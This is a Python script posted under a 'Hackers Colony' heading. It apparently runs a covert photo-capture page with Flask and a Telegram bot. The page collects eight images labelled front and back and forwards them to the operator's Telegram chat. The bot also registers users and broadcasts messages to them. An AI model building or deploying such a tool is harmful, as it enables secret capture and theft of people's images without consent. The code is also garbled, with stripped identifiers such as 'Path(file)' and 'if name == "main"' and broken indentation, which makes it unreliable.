Hackers Colony Official:
#!/usr/bin/env python3
import os
import sqlite3
import threading
import time
import json
from datetime import datetime
from pathlib import Path
from io import BytesIO

from flask import Flask, request, render_template, jsonify, abort, send_from_directory
import requests

# Telegram bot framework (async polling)
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Config from env
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
UPLOAD_SECRET = os.environ.get("UPLOAD_SECRET", "change-me")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "")  # comma-separated numeric Telegram user ids

if not BOT_TOKEN or not TELEGRAM_CHAT_ID:
    raise RuntimeError("Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables before starting")

ADMIN_ID_SET = set()
for a in filter(None, [x.strip() for x in ADMIN_IDS.split(",")]):
    try:
        ADMIN_ID_SET.add(int(a))
    except:
        pass

# Paths
BASE_DIR = Path(file).parent
DB_PATH = BASE_DIR / "data.db"
UPLOADS_DIR = BASE_DIR / "uploads"
UPLOADS_DIR.mkdir(exist_ok=True)

# Flask app
app = Flask(name, template_folder="templates", static_folder="static")

# Simple SQLite helpers
def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                created_at TEXT,
                active INTEGER DEFAULT 1
            )
        """)
        conn.commit()

def add_or_update_user(user_id: int, username: str, first_name: str, last_name: str):
    now = datetime.utcnow().isoformat()
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
        if cur.fetchone():
            cur.execute("""
                UPDATE users SET username=?, first_name=?, last_name=?, active=1 WHERE user_id=?
            """, (username, first_name, last_name, user_id))
        else:
            cur.execute("""
                INSERT INTO users (user_id, username, first_name, last_name, created_at, active)
                VALUES (?, ?, ?, ?, ?, 1)
            """, (user_id, username, first_name, last_name, now))
        conn.commit()

def list_users(limit=200, offset=0):
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT user_id, username, first_name, last_name, created_at, active FROM users ORDER BY created_at DESC LIMIT ? OFFSET ?", (limit, offset))
        return cur.fetchall()

def user_count():
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM users")
        return cur.fetchone()[0]

def update_user_field(user_id: int, field: str, value):
    if field not in ("username", "first_name", "last_name", "active"):
        raise ValueError("invalid field")
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.cursor()
        cur.execute(f"UPDATE users SET {field} = ? WHERE user_id = ?", (value, user_id))
        conn.commit()
        return cur.rowcount

# Telegram API helper for sending media group via multipart (requests)
TELEGRAM_SEND_MEDIA_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMediaGroup"

def send_media_group_to_chat(chat_id, file_streams):
    """
    file_streams: list of tuples (filename, bytes, mimetype, caption)
    Sends photos as a media group to the chat_id using Telegram sendMediaGroup.
    """
    # Build media JSON and file payload
    media = []
    files_payload = {}
    for i, (fname, fb, mtype, caption) in enumerate(file_streams):
        attach_name = f"photo{i}"
        media.append({
            "type": "photo",
            "media": f"attach://{attach_name}",
            "caption": caption or ""
        })
        files_payload[attach_name] = (fname, fb, mtype)

media_json = json.dumps(media)
    multipart = {
        'chat_id': (None, str(chat_id)),
        'media': (None, media_json)
    }
    # add files
    for k, v in files_payload.items():
        multipart[k] = v

    resp = requests.post(TELEGRAM_SEND_MEDIA_URL, files=multipart, timeout=30)
    return resp

# Flask routes
@app.route("/")
def index():
    # Render capture page and inject UPLOAD_SECRET
    return render_template("index.html", upload_secret=UPLOAD_SECRET)

@app.route("/upload", methods=["POST"])
def upload():
    # Validate secret
    secret = request.form.get("secret") or request.headers.get("X-Upload-Secret")
    if not secret or secret != UPLOAD_SECRET:
        return jsonify({"ok": False, "error": "invalid secret"}), 403

    # Collect images[] or any files
    files = []
    if "images[]" in request.files:
        files = request.files.getlist("images[]")
    else:
        # Accept named fields in order
        for k in sorted(request.files.keys()):
            files.append(request.files.get(k))

    if len(files) != 8:
        return jsonify({"ok": False, "error": f"expected 8 images, got {len(files)}"}), 400

    # Convert to tuples for Telegram: (filename, bytes, mimetype, caption)
    file_streams = []
    for i, fs in enumerate(files):
        # read bytes
        b = fs.read()
        fname = fs.filename or f"photo-{i}.jpg"
        mtype = fs.mimetype or "image/jpeg"
        side = "Front" if i < 4 else "Back"
        idx = (i % 4) + 1
        caption = f"{side} {idx}"
        file_streams.append((fname, BytesIO(b), mtype, caption))

    # Save locally (audit) - optional: comment out if not desired
    timestamp = datetime.utcnow().strftime("%Y%m%d%H%M%S")
    saved_paths = []
    for i, (fname, bio, _, caption) in enumerate(file_streams):
        path = UPLOADS_DIR / f"{timestamp}_{i}_{fname}"
        with open(path, "wb") as f:
            bio.seek(0)
            f.write(bio.read())
        saved_paths.append(str(path))
        bio.seek(0)

    # Send to Telegram chat as media group
    resp = send_media_group_to_chat(TELEGRAM_CHAT_ID, [(pname, bio, mtype, cap) for (pname, bio, mtype, cap) in file_streams])
    if resp.status_code != 200:
        return jsonify({"ok": False, "error": "telegram_error", "details": resp.text}), 500

    return jsonify({"ok": True, "result": resp.json(), "saved": saved_paths}), 200

# Serve static files (if any)
@app.route("/static/<path:fname>")
def static_files(fname):
    return send_from_directory(str(BASE_DIR / "static"), fname)

# ---------- Telegram bot (polling) ----------
async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_or_update_user(user.id, user.username or "", user.first_name or "", user.last_name or "")
    await update.message.reply_text("Welcome! You are registered. You will receive admin messages if any.")

async def help_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("/start - register\n/help - this help\n")

def is_admin(user_id: int):
    return user_id in ADMIN_ID_SET

async def usercount_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("Unauthorized. This command is for admins only.")
        return
    cnt = user_count()
    await update.message.reply_text(f"Registered users: {cnt}")

async def list_users_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("Unauthorized. Admins only.")
        return
    # optional limit param
    args = context.args
    limit = 100
    offset = 0
    if args and args[0].isdigit():

limit = int(args[0])
    rows = list_users(limit=limit, offset=offset)
    if not rows:
        await update.message.reply_text("No users found.")
        return
    out_lines = []
    for r in rows:
        out_lines.append(f"id:{r[0]} user:{r[1]} name:{r[2] or ''} {r[3] or ''} active:{r[5]}")
    # send as a text file if too long
    text = "\n".join(out_lines)
    if len(text) > 3000:
        bio = BytesIO(text.encode("utf-8"))
        bio.name = "users.txt"
        bio.seek(0)
        await context.bot.send_document(chat_id=update.effective_chat.id, document=bio)
    else:
        await update.message.reply_text(text)

async def broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("Unauthorized. Admins only.")
        return
    # Usage: /broadcast Your message here
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = " ".join(args)
    await update.message.reply_text(f"Broadcasting message to all users ({user_count()})...")
    rows = list_users(limit=100000, offset=0)
    sent = 0
    failed = 0
    for r in rows:
        target_id = r[0]
        try:
            await context.bot.send_message(chat_id=target_id, text=message)
            sent += 1
            time.sleep(0.05)  # small throttle
        except Exception as e:
            failed += 1
            # Optionally mark inactive if bot is blocked
            try:
                update_user_field(target_id, "active", 0)
            except:
                pass
    await update.message.reply_text(f"Broadcast done. Sent: {sent}, Failed: {failed}")

async def update_user_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("Unauthorized.")
        return
    # Usage: /update_user <user_id> <username>
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /update_user <user_id> <username>")
        return
    try:
        target = int(args[0])
    except:
        await update.message.reply_text("Invalid user_id.")
        return
    new_username = args[1]
    updated = update_user_field(target, "username", new_username)
    if updated:
        await update.message.reply_text(f"Updated user {target} username -> {new_username}")
    else:
        await update.message.reply_text("No such user or nothing changed.")

def run_telegram_bot_polling():
    # Create and run the async application (blocking)
    app_tb = ApplicationBuilder().token(BOT_TOKEN).build()
    app_tb.add_handler(CommandHandler("start", start_handler))
    app_tb.add_handler(CommandHandler("help", help_handler))
    app_tb.add_handler(CommandHandler("usercount", usercount_handler))
    app_tb.add_handler(CommandHandler("list_users", list_users_handler))
    app_tb.add_handler(CommandHandler("broadcast", broadcast_handler))
    app_tb.add_handler(CommandHandler("update_user", update_user_handler))

    # Start polling (will block). We run this in a thread.
    app_tb.run_polling()

# ---------- App start ----------
if name == "main":
    init_db()
    # Start telegram bot in background thread
    t = threading.Thread(target=run_telegram_bot_polling, daemon=True)
    t.start()
    # Run Flask app (production: use gunicorn + reverse proxy)
    port = int(os.environ.get("PORT", 5000))
    # Note: for Railway, ensure the web process listens on PORT env var.
    app.run(host="0.0.0.0", port=port)
